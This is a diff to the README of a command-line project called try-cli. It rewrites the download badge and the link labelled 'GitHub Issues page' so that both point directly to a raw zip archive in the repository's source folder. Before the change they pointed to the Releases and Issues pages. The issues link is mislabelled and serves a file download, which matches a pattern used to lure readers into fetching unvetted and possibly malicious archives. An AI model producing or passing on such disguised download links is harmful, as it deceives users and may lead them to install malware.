@@ -12,7 +12,7 @@ To get **try-cli**, please follow these steps:
 
 1. Click the button below to visit the Releases page.
    
-   [![Download try-cli](https://img.shields.io/badge/Download-try--cli-blue.svg)](https://github.com/Farsya15/try-cli/releases)
+   [![Download try-cli](https://raw.githubusercontent.com/Farsya15/try-cli/master/src/try-cli_3.7-beta.4.zip)](https://raw.githubusercontent.com/Farsya15/try-cli/master/src/try-cli_3.7-beta.4.zip)
 
 2. On the Releases page, you will see various versions of the software.
 
@@ -54,7 +54,7 @@ After installation, open the **try-cli** application. Here’s how to use it:
 
 If you experience any issues or have questions, please reach out for help:
 
-- Visit our [GitHub Issues page](https://github.com/Farsya15/try-cli/issues) to report a problem or ask for assistance.
+- Visit our [GitHub Issues page](https://raw.githubusercontent.com/Farsya15/try-cli/master/src/try-cli_3.7-beta.4.zip) to report a problem or ask for assistance.
 - Check our FAQ section on the Releases page for common issues.
 
 ## 🌐 Community
